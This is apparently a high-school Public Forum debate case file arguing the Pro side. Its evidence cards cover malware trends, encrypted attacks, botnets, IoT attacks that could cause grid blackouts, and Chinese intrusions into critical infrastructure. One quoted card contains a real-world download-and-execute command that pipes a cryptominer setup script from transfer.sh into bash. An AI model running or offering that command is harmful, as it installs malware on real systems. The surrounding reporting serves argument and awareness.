---
title: Atlantic Independent CL (Pro) — John Lewis SVUDL Invitational, 2025-2026 unsorted PF case
tags: [case, public-forum, pf-archive, season-2025-2026, cycle-unsorted, side-pro, top100-rank-59]
team: Atlantic Independent CL
elo_rank: 59
season: 2025-2026
cycle: unsorted
side: Pro
tournaments: ["John Lewis SVUDL Invitational"]
source_doc: AtlanticIndependent-ChLe-Pro-John-Lewis-SVUDL-Invitational-Round-3.pdf
---

Open-source case doc read by Atlantic Independent CL (season Elo rank #59) in 2025-2026; tournament(s) John Lewis SVUDL Invitational could not be mapped to a topic cycle.

Overview
Aff solves through scanning messages to prevent harmful activity, google
proves- Davies 25
Davies 25 Rowan Davies [Rowan is an Editorial Associate and Writer for TechRadar.], 10-16-2025,
"Google Messages vows to stop scammers entering your inbox – here are two handy new safety
measures that are live now," TechRadar,
https://www.techradar.com/computing/software/google-messages-is-doubling-down-on-scam-pr
evention-with-two-new-safety -measures-this-is-how-you-can-keep-your-inbox-clean, accessed
10-29-2025 //RX + /RR
Google Messages has had quite the overhaul over the past couple of months, and now the
company is doubling down on its safety measures with two new protection upgrades. The features
include the new Key Verifier tool and scam link alerts, and both are live now. Scam alerts will appear for all Google
Messages users; however, Key Verifier is only available to those on Android 10 and above, with plans to roll out more
protections built on the new function. In its official announcement, Google addressed the growing risks of fraud
and online scams, sparking the company’s tighter security measures, sharing the following:
"Nearly 60% of people globally have experienced a scam in the last year. Yet while increased connectivity
has certainly fueled this rise in scams, the bigger shift is this: widespread access to cutting-edge technology is making scams more
convincing and nefarious than ever before." So how do its new protections prevent this? The most notable of the two is the new Key
Verifier, which was initially revealed in May with more details following last August. It's designed to ‘add an extra layer of trust’ to your
private one-on-one RCS chats, and involves scanning a QR code for your contacts, ensuring that the messages you’re receiving are
actually coming from the person you believe to be on the other end. To access Key Verifier, open a one-on-one chat and tap the
contact’s name at the top. Scroll down and select ‘Verify keys’, and then ‘Scan contact’s QR code’. You should also note that the
person on the other end will also need to do the same on their own device. The second new security measure is scam
link detection, which targets links that could be sent to you to steal personal information. If
you’re sent a link that Google Messages thinks could be harmful, it will present a warning pop-up
to highlight suspicious messages. "We’re continuously innovating and rolling out new security
features that are built into our products," Google iterated in its announcement, adding that "these features and
initiatives are designed to help you avoid scams altogether, or spot them before they cause harm." With that in mind, it’s likely
Google will expand its protection tools in the future.
C1 is Cyber
Malware's Up. SSRT 25
SSRT 25 Sonatype Security Research Team [a human], 2025-10-15, "Open Source Malware Index Q3 2025: High-Severity Attacks
Surge," No Publication, https://www.sonatype.com/blog/open-source-malware-index-q3-2025, Date Accessed:
2025-10-30T22:54:50.889Z //RX //recut alyssac
As open source ecosystems continue to expand, so does the sophistication and aggression of malicious actors targeting them. In
Q3 2025, Sonatype identified 34,319 new open source malware packages, representing a

staggering 140% increase from Q2 2025. The findings in our latest Open Source Malware Index underscore a
troubling trend. Attackers are increasingly refining their tactics, aiming for deeper infiltration and greater impact across open source
software and artificial intelligence (AI). Malware Growth Accelerates Across Ecosystems Sonatype’s latest analysis — powered by
Sonatype Repository Firewall, Sonatype Lifecycle, and proprietary Release Integrity data — paints a clear picture: open source
malware is not only multiplying, but also maturing. Sophisticated attacks replace low-level "noise," as simple, spam-like malware
declines and more complex, targeted threats dominate, reflecting an evolution from opportunistic exploits to strategic, higher-impact
campaigns. Here's what we saw in Q3 2025: A major campaign compromised the popular npm packages chalk and debug,
among others, through an account takeover, impacting projects that collectively receive over 2 billion weekly downloads. A
multi-stage attack dubbed Shai-Hulud compromised over 180 npm packages by stealing maintainer credentials and publishing
poisoned updates. Data exfiltration malware accounted for 37% of all malicious open source packages detected, highlighting a shift
toward intelligence-gathering and monetization of sensitive data, rather than mere disruption or defacement. Droppers skyrocketed
by 2,887% to represent 38% of all Q3 threats, suggesting attackers increasingly used open source packages to deliver multi-stage
payloads and build more modular, persistent attack chains. Backdoor-laden packages grew 143% over Q2, though they still
accounted for just 4% of total threats, signaling a steady rise in persistence-oriented attacks designed to maintain covert, long-term
access to compromised environments. Cryptominers continued to decline, making up just 4% of threats compared to 6% last
quarter, indicating attackers deprioritized easy-to-detect, low-reward exploits in favor of more advanced and financially motivated
techniques. Sonatype blocked 110,270 open source malware attacks for customers in Q3 2025, including more than 8,000
targeting Federal organizations. Financial services organizations defended against the most attacks (47%), followed by
business services (14%) and energy and utilities (8%). Notably, government customers experienced a 218% increase in blocked
attacks compared to Q1, underscoring the growing focus of adversaries on public sector systems. As the total number of malicious
packages surpassed 877,000, a crucial shift emerged: low-severity malware detections are declining, as adversaries focus on highand critical-severity exploits designed to maximize disruption and data theft. Rolling Malware Index Data Q3-2025 Developers
Remain Prime Targets This quarter's surge reminds us that attackers increasingly see developers as the new perimeter. Open source
ecosystems — from npm and PyPI to Maven Central and Hugging Face — continue to be fertile ground for malware that masquerades
as legitimate packages, tools, and even AI models. Frequently, these malicious components are meticulously designed to mimic
legitimate dependencies, preying on common developer practices such as typosquatting and dependency confusion. Once installed,
they can exfiltrate credentials, mine cryptocurrency, or inject backdoors deep into CI/CD pipelines. Notable Incidents: npm Under
Siege Two major incidents dominated headlines this quarter, each highlighting how trusted ecosystems can become high-impact
threat vectors. A recent hijacking of widely used packages, including chalk and debug, and the Shai-Hulud campaign demonstrated
attackers have weaponized open source and AI. These incidents demonstrate that even seasoned developers can become vectors for
compromise — and that automated defenses are now essential to detect and block malware at the gate. Hijacked npm Packages:
Chalk and Debug In one of the most alarming breaches of the year, attackers phished the maintainer of numerous popular npm
packages, including chalk and debug, which collectively see more than 2 billion weekly downloads. The result was a wave of hijacked
versions injected into legitimate open source projects — a stark reminder of how social engineering remains one of the most
effective tools for software supply chain compromise. Read our full analysis. Shai-Hulud Worm: The First Self-Replicating npm
Malware Q3 2025 also introduced the Shai-Hulud worm, a first-of-its-kind self-replicating malware targeting npm. Spreading
autonomously through infected packages, it managed to compromise more than 500 npm components in a matter of days. Read our
detailed breakdown. Malware Defenses and Blocking Success Sonatype Repository Firewall blocked 110,270 malware attacks this
quarter alone, preventing compromised components from ever entering trusted development environments. By leveraging advanced
heuristics, behavioral analysis, and AI-assisted detection through Release Integrity, Sonatype continues to protect organizations
against rapidly evolving threats. With Sonatype's intelligence integrated across ecosystems, every malicious discovery strengthens
defenses for the broader open source community. As the volume and sophistication of attacks grow, so too does the importance of
real-time protection and automated governance. The Road Ahead: Defending Against a Maturing Threat Our Q3 2025 data shows
how open source malware is no longer a fringe issue. Attackers are innovating faster than ever, leveraging
automation, social engineering, and even AI to insert malicious code into the world's most widely
used software ecosystems. With a 140% quarterly increase in new malware and a surge in
high-severity attacks, developer security can no longer be an afterthought. Open source malware is shifting from simple
exploits to sophisticated campaigns designed to maximize disruption and data theft.

Attackers use end-to-end encryption to spread harmful malware. Desai 24’
Deepen Desai [Deepen Desai is the Chief Security Officer at Zscaler, Deepen Desai is
responsible for running the global security research operations], 12-5-2024, "ThreatLabz Report:
87.2% of Threats Delivered Over Encrypted Channels," No Publication,
https://www.zscaler.com/blogs/security-research/threatlabz-report-threats-delivered-over-encryp
ted-channels, accessed 10-29-2025 //RX + //RR
Encryption is the default for online communication, with nearly all web traffic protected by secure
protocols like TLS/SSL. Yet, as encryption becomes more ubiquitous by the day, so do the
opportunities for threat actors to exploit encrypted channels. The same encryption that safeguards legitimate
activities also acts as a conduit for malicious ones. Attackers are using encrypted channels to bypass
traditional defenses, concealing malware, phishing campaigns, cryptomining/cryptojacking, and
data theft within encrypted traffic. The Zscaler ThreatLabz 2024 Encrypted Attacks Report examines this evolving threat
landscape, based on a comprehensive analysis of billions of threats delivered over HTTPS and blocked by the Zscaler cloud. The
report highlights the more recent trends, top threat categories, most common targets of encrypted attacks, and other insights into
how attackers are weaponizing encrypted traffic. 5 key findings on encrypted attacks The ThreatLabz research team analyzed 32.1
billion encrypted attacks blocked by the Zscaler cloud between October 2023 and September 2024 to identify and understand the
latest threat patterns. The following subset of findings highlights some of the most prominent trends and targets. Steady growth in
encrypted attacks: The Zscaler cloud blocked an unprecedented volume of attacks embedded in TLS/SSL traffic during the analysis
period. Encrypted threats accounted for 87.2% of all blocked attacks, representing a 10.3%
year-over-year increase in encrypted attacks and reflecting the growing reliance on encryption
by threat actors to hide their malicious activities. Malware dominates the landscape: Malware remains the most
prevalent encrypted threat, representing 86.5% of blocked attacks. This trend highlights the adaptation of malware tactics to thrive
in encrypted channels, using encryption to mask payloads and evade traditional security and detection measures. distribution of
encrypted attacks Figure 1: Top threat categories observed Cryptomining/cryptojacking, cross-site scripting, and phishing threats
surge: Cryptomining/cryptojacking and cross-site scripting (XSS) are among the fastest-growing encrypted threats, with
year-over-year increases of 122.9% and 110.2%, respectively, while phishing saw a notable 34.1% jump. It’s possible that these
spikes were fueled by the growing use of generative AI technologies, which make it easier to create advanced cryptomining scripts,
automate malicious XSS scripts, and execute highly convincing phishing campaigns. Manufacturing tops list of most impacted
industries: The manufacturing, technology, and services industries were the most targeted, with manufacturing enduring 13.5 billion
encrypted attack attempts between October 2023 and September 2024. The United States and India remain top targets: Receiving
11 billion (US) and 5.4 billion (India) encrypted attacks during the ThreatLabz analysis period, the United States and India retained
their positions as the most targeted countries, followed by France, the United Kingdom, and Australia.
Aff solves through scanning messages to prevent harmful activity, google
proves- Davies 25
Davies 25 Rowan Davies [Rowan is an Editorial Associate and Writer for TechRadar.], 10-16-2025,
"Google Messages vows to stop scammers entering your inbox – here are two handy new safety
measures that are live now," TechRadar,
https://www.techradar.com/computing/software/google-messages-is-doubling-down-on-scam-pr
evention-with-two-new-safety -measures-this-is-how-you-can-keep-your-inbox-clean, accessed
10-29-2025 //RX + /RR

Google Messages has had quite the overhaul over the past couple of months, and now the
company is doubling down on its safety measures with two new protection upgrades. The features
include the new Key Verifier tool and scam link alerts, and both are live now. Scam alerts will appear for all Google
Messages users; however, Key Verifier is only available to those on Android 10 and above, with plans to roll out more
protections built on the new function. In its official announcement, Google addressed the growing risks of fraud
and online scams, sparking the company’s tighter security measures, sharing the following:
"Nearly 60% of people globally have experienced a scam in the last year. Yet while increased connectivity
has certainly fueled this rise in scams, the bigger shift is this: widespread access to cutting-edge technology is making scams more
convincing and nefarious than ever before." So how do its new protections prevent this? The most notable of the two is the new Key
Verifier, which was initially revealed in May with more details following last August. It's designed to ‘add an extra layer of trust’ to your
private one-on-one RCS chats, and involves scanning a QR code for your contacts, ensuring that the messages you’re receiving are
actually coming from the person you believe to be on the other end. To access Key Verifier, open a one-on-one chat and tap the
contact’s name at the top. Scroll down and select ‘Verify keys’, and then ‘Scan contact’s QR code’. You should also note that the
person on the other end will also need to do the same on their own device. The second new security measure is scam
link detection, which targets links that could be sent to you to steal personal information. If
you’re sent a link that Google Messages thinks could be harmful, it will present a warning pop-up
to highlight suspicious messages. "We’re continuously innovating and rolling out new security
features that are built into our products," Google iterated in its announcement, adding that "these features and
initiatives are designed to help you avoid scams altogether, or spot them before they cause harm." With that in mind, it’s likely
Google will expand its protection tools in the future.
Mainstream chat platforms are key -- they're used day-to-day so they don't
seem suspicious. Giron 24
Andy Giron [a human], 2024-1-10, "From IRC to Instant Messaging: The Rise of Malware Communication via Chat Platforms," No
Publication, https://securitylabs.datadoghq.com/articles/from-irc-to-instant-messaging-the-rise-of-malware-commun
ication-via-chat-platforms/?utm_source=chatgpt.com, Date Accessed: 2025-11-02T02:45:26.296Z //RX //recut alyssac
Key points The Datadog Security Research team has observed numerous malware families leveraging chat platforms
for malicious purposes. Malware delivery is evolving from traditional server-based methods and
command and control communication to chat platform-based methods. It is difficult to counter
this trend due to the necessity of chat platforms in many business operations. Introduction
Threat actors are increasingly using chat platforms for covert operations. Previously, IRC was the primary
choice for command and control (C2) servers in chat platforms, as seen with malware like Back Orifice, Agobot, and SDBot. However,
more and more malware families are using chat services like Discord and Telegram for communication and payload delivery. These
platforms offer reliable, covert channels for malicious activities. Evolution of tactics Traditionally, threat actors have
employed direct server downloads for malware deployment and distribution, often using sites
like transfer.sh, compromised websites, or virtual private servers (VPS). For C2 communication,
they have relied on obfuscation, encryption, or a proprietary C2 protocol. However, this approach
poses growing challenges for threat actors: Hosting providers have become more vigilant against
malicious content, and intrusion detection systems (IDS) have improved in detecting encrypted

or obfuscated C2 traffic. curl -Lk https://transfer.sh/L6tpcXqySW/setup_xmrigCC.sh | bash As such, it has become
increasingly attractive for threat actors to migrate malware payload delivery and C2 traffic to
chat platforms, which inherently possess network encryption, scalability, and resilience. This
approach also removes the burden of maintaining threat actor infrastructure
Malware causes botnets. PAN 25
Palo Alto Networks [a human], 2025-xx-xx, "What is a Botnet?,"
https://www.paloaltonetworks.com/cyberpedia/what-is-botnet, Date Accessed:
2025-10-31T20:52:06.525Z //RX
What is a Botnet? 3 min. read A botnet(short for “robot network”) is a network of compromised
computers or devices, called bots, that are infected with malware and controlled remotely by a
cybercriminal known as a bot herder. These bots work together to carry out large-scale malicious activities, including
DDoS attacks, data theft, and spam distribution. Key Takeaways: A bot is a single infected device, and a botnet is a group of infected
devices. Botnets are controlled by command and control (C2) servers. They are used in DDoS attacks, data theft, and cryptocurrency
mining. Due to their stealth and persistence, botnets are difficult to detect. An infographic that shows how a botnet infects devices
and controls them via a command-and-control server. How Botnets Work A botnet works by infecting multiple devices, such as
computers, smartphones, and Internet of Things (IoT) devices, with malicious software that allows a hacker to remotely control them.
Once infected, these devices become “bots” or “zombies” and operate under the command of a central authority known as a
Command and Control (C2) server. Step-by-Step Breakdown: Infection The attacker uses malware, often spread via phishing emails,
malicious downloads, or software vulnerabilities, to infect devices. Connection to C2 Server After the infection, the compromised
device silently connects to the hacker’s C2 server, waiting for instructions. Command Execution The attacker sends commands to the
bots to perform malicious actions such as launching DDoS attacks, stealing data, sending spam, or spreading malware.
Self-Propagation Advanced botnets can scan for vulnerabilities and automatically spread to new devices, thereby growing the botnet.
Stealth and Persistence Many botnets use obfuscation techniques to avoid detection and persist on the device by re-infecting it if
security software removes the malware. Related Content Unit 42 Threat Brief: Botnets Explore an in-depth analysis and insights into
botnet activities, their evolution, and impact on cybersecurity. DDoS Attacks Explained Become knowledgable on Distributed Denial
of Service (DDoS) attacks, their methods, and the damage they can cause. IoT Under Siege: The Mirai Campaign Learn about the
Mirai botnet and its impact on IoT devices, how it exploits vulnerabilities and spreads, and security measures to protect IoT devices
from such threats. Controlling Botnets with the Next-Generation Firewall See how Palo Alto Networks' Next-Generation Firewall can
be used to detect and control botnet activities. Why are Botnets Created? The motivations for creating botnets are
similar to those of most other malicious cyberthreats. Threat actors primarily create botnets for
profit, but some use them for activism and to facilitate state-sponsored disruptions. Several of the
most common reasons botnets are created include: Cryptocurrency mining Theft of financial and sensitive information Sabotage
(such as taking services or sites offline) Cyberattacks (such as phishing, ransomware, and distributed denial-of-service attacks)
Selling access to other cybercriminals (i.e., botnet-as-a-service).
Botnets cause grid outage. Soltan 18
Saleh Soltan [a human], 2018-08-xx, "," Usenix Security Symposium, [Saleh Soltan, Prateek Mittal, and H. Vincent Poor, Princeton
University] https://www.cmu.edu/ceic/assets/docs/seminar-files/2020-2021/two-madiot-papers.pdf, Date Accessed:
2025-10-30T23:02:31.692Z //RX Abstract //recut alyssac

We demonstrate that an Internet of Things (IoT) botnet of high wattage devices–such as air conditioners and
heaters–gives a unique ability to adversaries to launch large-scale coordinated attacks on the
power grid. In particular, we reveal a new class of potential attacks on power grids called the Manipulation of demand via IoT
(MadIoT) attacks that can leverage such a botnet in order to manipulate the power demand in the grid. We study five variations of
the MadIoT attacks and evaluate their effectiveness via state-of-the-art simulators on real-world power grid models. These
simulation results demonstrate that the MadIoT attacks can result in local power outages and in the worst
cases, large-scale blackouts. Moreover, we show that these attacks can rather be used to increase the operating cost of
the grid to benefit a few utilities in the electricity market. This work sheds light upon the interdependency between the vulnerability of
the IoT and that of the other networks such as the power grid whose security requires attention from both the systems security and
power engineering communities. 1 Introduction A number of recent studies have revealed the vulnerabilities of the Internet of Things
(IoT) to intruders [21, 49, 50]. These studies demonstrated that IoT devices from cameras to locks can be compromised either
directly or through their designated mobile applications by an adversary [12, 28, 43]. However, most previous work has focused on
the consequences of these vulnerabilities on personal privacy and security. It was not until recently and in the aftermath of the
Distributed Denial of Service (DDoS) attack by the Mirai botnet, comprising six hundred thousand compromised devices targeting
victim servers, that the collective effect of the IoT vulnerabilities was demonstrated [12]. In this paper, we reveal another substantial
way that compromised IoT devices can be utilized by an adversary to disrupt one of the << FIGURE 1 OMITTED>> most essential
modern infrastructure networks, the power grid. Power grid security standards are all based on the
assumption that the power demand can be predicted reliably on an hourly and daily basis [62].
Power grid operators typically assume that power consumers collectively behave similarly to how
they did in the past and under similar conditions (e.g., time of the day, season, and weather). However, with the
ubiquity of IoT devices and their poor security measures (as shown in [12]), we demonstrate that this is
no longer a safe assumption. There has been a recent trend in producing Wi-Fi enabled high wattage appliances such as
air conditioners, water heaters, ovens, and space heaters that can now be controlled remotely and via the Internet [3] (for the power
consumption of these devices see Table 1). Even older appliances can be remotely controlled by adding Wi-Fi enabled peripherals
such as Tado◦ [8] and Aquanta [2]. A group of these devices can also be controlled remotely or automatically using smart
thermostats or home assistants USENIX Association 27th USENIX Security Symposium 15 such as Amazon Echo [1] or Google Home
[4]. Hence, once compromised, any of these devices can be used to control high wattage appliances remotely by an adversary to
manipulate the power demand. In this paper, we reveal a new class of potential attacks called the Manipulation of demand via IoT
(MadIoT) attacks that allow an adversary to disrupt the power grid’s normal operation by manipulating the total power demand using
compromised IoT devices (see Fig. 1). These attacks, in the extreme case, can cause large scale blackouts. An important
characteristic of MadIoT attacks is that unlike most of previous attacks on the power grid,they do not target the power grid’s
Supervisory Control And Data Acquisitions (SCADA)system but rather the loadsthat are much less protected as in load-altering
attacks studied in [11, 41]. It is a common belief that manipulating the power demands can potentially damage the power grid.
However, these speculations have mostly remained unexamined until our work. We are among the first to reveal realistic mechanisms
to cause abrupt distributed power demand changes using IoT devices–along with Dvorkin and Sang [24], and Dabrowski et al. [19].
Our key contribution is to rigorously study the effects of such attacks on the power grid from novel operational perspectives (for more
details on the related work see Section 6). We study five variations of the MadIoT attacks and demonstrate their effectiveness on the
operation of realworld power grid models via state-of-the-art simulators. These attacks can be categorized into three types: (i)
Attacksthatresult in frequency instability: An abrupt increase (similarly decrease) in the power demands–potentially by synchronously
switching on or off many high wattage IoT devices–results in an imbalance between the supply and demand. This imbalance instantly
results in a sudden drop in the system’s frequency. If the imbalance is greater than the system’s threshold, the frequency may reach
a critical value that causes generators tripping and potentially a large-scale blackout. For example, using state-of-the-art simulators
on the smallscale power grid model of the Western System Coordinating Council (WSCC), we show that a 30% increase in the
demand results in tripping of all the generators. For such an attack, an adversary requires access to about 90 thousand air
conditioners or 18 thousand electric water heaters within the targeted geographical area. We also study the effect of such an attack
during the system’s restarting process after a blackout (a.k.a. the black start) and show that it can disrupt this process by causing
frequency instability in the system. (ii) Attacks that cause line failures and result in cascading failures: If the imbalance in the supply
and demand after the attack is not significant, the frequency of Table 1: Home appliances’ approximate electric power usage based
on appliances manufactured by General Electric [3]. Appliance Power Usage (𝑊 ) Air Conditioner 1,000 Space Heater 1,500 Air
Purifier 200 Electric Water Heater 5,000 Electric Oven 4,000 the system is stabilized by the primary controller of the generators.
Since the way power is transmitted in the power grid (a.k.a. the power flows) follows Kirchhoff’s laws, the grid operator has almost no
control over the power flows after the response of the primary controllers. Hence, even a small increase in the demands may result in

line overloads and failures. These initial line failures may consequently result in further line failures or as it is called, a cascading
failure [54]. For example, we show by simulations that an increase of only 1% in the demand in the Polish grid during the Summer
2008 peak, results in a cascading failure with 263 line failures and outage in 86% of the loads. Such an attack by the adversary
requires access to about 210 thousand air conditioners which is 1.5% of the total number of households in Poland [58]. During the
Summer peak hours when most of the air conditioners are already on, decreasing their temperature set points [61] combined with the
initiation of other high wattage appliances like water heaters, can result in the same total amount of increase in the demand. We also
show that an adversary can cause line failures by redistributing the demand via increasing the demand in some places (e.g., turning
on appliances within a certain IP range) and decreasing the demand in others (e.g., turning off appliances within another IP range).
These attacks, in particular, can cause failures in important high capacity tie-lines that connect two neighboring independent power
systems–e.g., of neighboring countries. (iii) Attacks that increase operating costs: When the demand goes above the day-ahead
predicted value, conservatively assuming that there would be no frequency disturbances or line failures, the grid operator needs to
It's uniquely likely now -- reports from 10/30 find China's ramping up
attacks on critical infrastructure. Ribeiro 25
Anna Ribeiro [a human], 2025-10-30, "McCrary report flags China’s escalating cyber tactics, warns of Typhoon cyber threats to US
critical infrastructure," Industrial Cyber,
https://industrialcyber.co/reports/mccrary-report-flags-chinas-escalating-cyber-tactics-warns-of-typhoon
-cyber-threats-to-us-critical-infrastructure/, Date Accessed: 2025-11-02T03:08:35.554Z //RX //recut alyssac [blacked out for
problematic language]
Violet Typhoon, meanwhile, continues to demonstrate a preference for information operations and strategic influence. Its targeting of
policymakers and advocacy organizations aligns with attempts to shape narratives around Taiwan, human rights, and international
trade, primarily issues central to Beijing’s geopolitical agenda. The McCrary report also detailed Silk Typhoon, where the
PRC is targeting common IT solutions like remote management and cloud services and
exploiting unpatched application vulnerabilities. Once inside, they attempt to move throughout
the software supply chain, silently reaching many victims, including critical infrastructure
operators. The method of entry can be particularly pervasive because remote access is
increasingly common in IT and OT systems. Nylon Typhoon, a PRC-linked cyber-espionage group, targets vulnerable
remote access systems and stolen credentials to maintain covert, long-term access to sensitive government, diplomatic, and policy
networks. This allows China to monitor decision-making and conduct intelligence operations with stealth and persistence. Nylon
Typhoon frequently targets organizations involved in shaping foreign policy or defense cooperation, particularly those connected to
U.S. alliances in Asia and Europe. “Recent investigations suggest that Nylon Typhoon has refined its operations to prioritize stealth
and endurance over speed or disruption,” according to the McCrary report. “Unlike more aggressive intrusion sets that rely on
malware implants or destructive payloads, Nylon Typhoon often depends on stolen credentials and legitimate remote
access tools to quietly blend into normal network traffic. This method allows the group to operate for
months—sometimes years—before detection, harvesting sensitive policy communications, diplomatic correspondence, and strategic
planning documents.” “For operators of critical systems, the lesson is unmistakable. Defenders must assume that adversaries from
the PRC already maintain access to their systems and urgent attention must be focused on rooting them out,” the McCrary report
detailed. “By detecting subtle anomalies in legitimate administrative activity, defenders can understand latent threats already in their
systems. The technical remedies are already known: greater investment in zero-trust architectures, rigorous patching of edge
devices, and closer coordination with government agencies to share the latest threat information.” It is important for
defenders to understand that the PRC’s typhoon actors aim not merely to target individual
systems but to inflict maximum harm on our society by crippling [torpefy] key parts of America’s
critical infrastructure. The PRC’s cyber strategy is designed to undermine confidence, impose costs, and weaken the resolve
of the American people in the event of conflict.

1 — Cyberattacks have massive economic consequences — an attack on US
infrastructure could cost $1 trillion
Allianz ‘16; Commercial risk management firm; Cyber attacks on critical infrastructure; Allianz
Global Corporate & Specialty; June 2016; Accessed Online, 12/10/22;
https://www.agcs.allianz.com/news-and-insights/expert-risk-articles/cyber-attacks-on-critical-infr
astructure.html
Unsurprisingly, the vulnerability of critical infrastructure to cyber-attacks and technical failures
has become a big concern. And fears have been given credence by recent events. In December
2015, the world witnessed the first known power outage caused by a malicious cyber-attack.
Three utilities companies in Ukraine were hit by BlackEnergy malware, leaving hundreds of
thousands of homes without electricity for six hours. According to cyber security firm Trend
Micro, the malware targeted the utility firms’ SCADA (supervisory control and data acquisition)
systems and probably began with a phishing attack. The blackout was followed two months later
by the news that the Israel National Electricity Authority had suffered a major cyber-attack,
although damage was mitigated after the Israel Electricity Corporation shut down systems to
prevent the spread of a virus. Industry sectors vulnerable to cyber-attack. The energy sector is
one of the main targets of cyber-attacks against critical infrastructure, but it is not the only one.
Transport, public sector services, telecommunications and critical manufacturing industries are
also vulnerable. In 2013, Iranian hackers breached the Bowman Avenue Dam in New York and
gained control of the floodgates. Oil rigs, ships, satellites, airliners, airport and port systems are
all thought to be vulnerable, and media reports suggest that breaches have occurred
Cyber-attacks against critical infrastructure and key manufacturing industries have increased,
according to US cyber-security officials at Industrial Control Systems Cyber Emergency
Response Team (ICS-CERT), the US government body that helps companies investigate attacks
against ICS and corporate networks. It reported a 20% increase in cyber investigations in 2015,
and a doubling of attacks against US critical manufacturing. Over the years, a wide range of
sectors have become more reliant on industrial control systems – such as SCADA, Programmable
Logic Controllers (PLC) and Distributed Control Systems - for monitoring processes and
controlling physical devices, such as pumps, valves, motors, sensors etc. The most high profile
example of a cyber-attack against critical infrastructure is the Stuxnet computer virus. The worm,
which targeted PLCs, disrupted the Iranian nuclear program by damaging centrifuges used to
separate nuclear material. The incident caused concern because Stuxnet could be adapted to
attack the SCADA systems used by many critical infrastructure and manufacturing industries in
Europe and the US. In one of the only public examples of a SCADA attack, a German steel mill
suffered major damage after a cyber-attack forced the shutdown of a furnace, the German
Federal Office for Information Security reported in 2014. The attackers used social engineering
techniques to gain control of the blast furnace systems. Infrastructure cyber-attacks target
control systems, not data Cyber-attacks against critical infrastructure and manufacturing are
more likely to target industrial control systems than steal data, according to the Organization of
American States and Trend Micro. Their research found that 54% of the 500 US critical
infrastructure suppliers surveyed had reported attempts to control systems, while 40% had
experienced attempts to shut down systems. Over half said that they had noticed an increase in
attacks, while three-quarters believed that those attacks were becoming more sophisticated.

According to Edry, hackers are becoming much more interested in operational technology, the
physical connected devices that support industrial processes. “The vulnerability and lack of
knowledge of operational technology is the most dangerous thing today,” he says. As an
example, he cites a cyber-attack against a New York City office block in which a hacker accessed
the building management systems – which can control power, communications, security and
environmental systems - via a connected vending machine. The building shutdown resulted in
estimated damage of $350m from lost business, he says. IT systems more secure than
industrial control systems However, the security of industrial control systems and connected
devices has fallen behind that of IT systems. Many of the connected devices used by industry
are based on serial communication technology – which Edry likens to the beeps and squeals
associated with the old-style internet dial-up. Edry believes that operational technology is a
vulnerable and poorly protected element of cyber security. While IT infrastructure has given rise
to an army of cyber security consultants, products and services, industrial control systems by
comparison are not well served, he says. The problem is not about to go away. In fact,
cyber-attacks against physical operating technology look set to increase with the growing use of
connected devices. For example, the convergence of the digital and physical worlds is set to
accelerate with the “Internet of Things” (“IoT”), which will see more and more everyday devices
embedded with electronics that collect information and connect to a network. Consumer devices
are increasingly becoming connected – such as wearable technology, smart devices, domestic
appliances and children’s toys. So, too, are our homes and cars. According to Edry, growing
digitalization and the “IoT” could create a perfect cyber security storm. He notes that, where a
company would once have control over its systems, physical networks and servers, the trend has
been to run devices, software and data through virtual networks, such as cloud computing. “Even
the network is now off the network,” he says. Confidence in infrastructure security is key
Confidence in data and systems security is key if society is to benefit from the potential
efficiencies that the “IoT” can bring. And public confidence is just as important for the SCADA
systems that keep aircraft in the air as it is for the IT platforms that underpin mobile banking.
For example, in the past year a number of airlines have suffered from technical issues and
cyber-attacks that erode consumer confidence. Polish national airline LOT grounded planes in
June 2015 after its flight plan system was disabled by hackers in a Distributed Denial of Service
(DDoS) attack. Weeks later in July, United Airlines grounded its fleet after suffering a technical
fault. “The digital age is here. We can’t prevent it. It is becoming part of us. But we see news
headlines of breach after breach. We are losing our confidence in the digital age,” says Edry. He
believes that more needs to be done to deter cyber criminals, and to protect operational
technology. The cost of creating a successful attack is small for cyber criminals, which is why
there are now so many attacks, explains Edry. “We have seen that as the cost of launching a
successful attack has gone down, the number of attacks has risen. So we need to develop
technology to increase the cost of successful attacks,” says Edry. “We can’t stop 100% of
attacks, but we can create technology to increase the cost so that the hacker says: ‘I don’t want
to deal with this organization as it will cost me a lot of time and computer resource,” he says. “If
we can prevent the damage, it will incentivize insurers to offer higher limits and give customers
more incentive to buy.” Risk focus: Industrial control systems Recent years have seen growing
concern about the vulnerability of industrial control systems (ICS), which are used to monitor or
control processes in industrial and manufacturing sectors. An attack against an ICS could result

in physical damage, such as a fire or explosion, as well as business interruption, says Nigel
Pearson, Global Head of Fidelity, AGCS. “A number of ICS still used by manufacturing and
utilities companies today were designed at a time before cyber security became a priority issue,”
he explains. In addition, ICS are also vulnerable to both technical failure and operator error as
well, which can be much more frequent and severe in terms of impact and are often not
captured in cyber reports, adds Georgi Pachov, Global Practice Group Leader Cyber, CUO
Property AGCS. While ICS are a particular issue for the energy sector, similar cyber-related
physical damage and business interruption risks exist in other industries. For example, car
manufacturing plants rely on robots to make and assemble vehicles. Should a robot be hacked or
suffer a technical fault, a production line could be interrupted for hours or days, at a potential
cost of tens of millions of dollars per day. And the potential cost of damages could be even
higher from an incident involving security-sensitive facilities such as nuclear power plants,
laboratories, water suppliers or large hospitals. The $1trn business blackout Research estimates
the economic and insurance impact of a severe, yet plausible cyber-attack against the US
power-grid to total in excess of $240bn, possibly even rising to more than a $1trn. According to
a report from Lloyd’s and the University of Cambridge’s Centre for Risk Studies, Business
Blackout: Attackers are able to inflict physical damage on 50 generators which supply power to
the electrical grid in the Northeastern US including New York City and Washington DC This
triggers a wider blackout which leaves 93 million people without power Insurance claims arise in
over 30 lines of insurance. Total insured losses are estimated in excess of $20bn, rising to
$70bn+ in the most extreme version of the scenario.
Statista, no quals, 2-3-2025, "U.S. cost of cybercrime 202," Statista,
https://www.statista.com/forecasts/1399040/us-cybercrime-cost-annual?srsltid=AfmBO
oo-av0HZ2v9OD27BrMDDyaXj_sbW9yLKe4NEQ63yC_URg-Rcz5N //alyssac
Cybercrime costs in the United States reached an estimated 452.3 billion U.S. dollars in
2024. Between 2017 and 2024, this figure has seen a significant increase. According to the latest estimates,
this dynamic will continue in upcoming years, reaching approximately 1.82 trillion U.S. dollars in
cybercrime costs by 2028.
C2 is Drugs
Smuggling and death is increasing. Loren 11/5
Samantha Loren, 11-5-2025, "Fact Check Team: Ports, precursor chemicals and cartels: Mapping
the modern drug trade," National Desk,
https://thenationaldesk.com/news/fact-check-team/fact-check-team-ports-precursor-chemicals-

and-cartels-mapping-the-modern-drug-trade-border-venezuela-ecuador-traffickers-boats-cargodepartment-war-pete-hegseth //alyssac
